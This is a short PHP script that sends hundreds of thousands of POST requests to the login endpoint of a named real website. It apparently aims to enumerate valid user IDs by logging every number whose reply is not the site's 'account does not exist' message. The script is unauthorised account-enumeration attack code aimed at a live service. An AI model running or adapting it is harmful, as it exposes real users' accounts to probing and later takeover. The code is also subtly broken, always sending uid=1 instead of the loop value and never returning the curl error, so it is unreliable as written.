<?php
echo "Start time:".microtime(true)."\n";
$url = "http://www.ingkee.com/user/index/login";
$errNo = 0;
$info = array();
for($i =100000; $i<=1000000; $i++){
	echo $i."\n";
	$res = json_decode(BaseCurl($url, 'POST',array('uid'=>1),$errNo,$info),true);
	if($errNo || $info['http_code'] >=400){
		echo "Wrong request\n";
		var_dump($errNo,$info['http_code']);
		break;
	}
	if($res['status'] > -1 || $res['errormsg'] != "账号不存在"){
		echo "get right uid\n:";
		file_put_contents('ingkee.log',$i."\n",FILE_APPEND);
	}
}
function BaseCurl($url,$method='GET', $data, &$errNo, &$info){
$ch = curl_init();
$opts = array(
	CURLOPT_URL=>$url,
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_CUSTOMREQUEST => $method,
);
if($method == 'POST'){
	$opts[CURLOPT_POSTFIELDS] = $data;
}
curl_setopt_array($ch, $opts);
$res = curl_exec($ch);
$info = curl_getinfo($ch);
$curl_no = curl_errno($ch); 
curl_close($ch);
return $res;
}

echo "End time:".microtime(true)."\n";
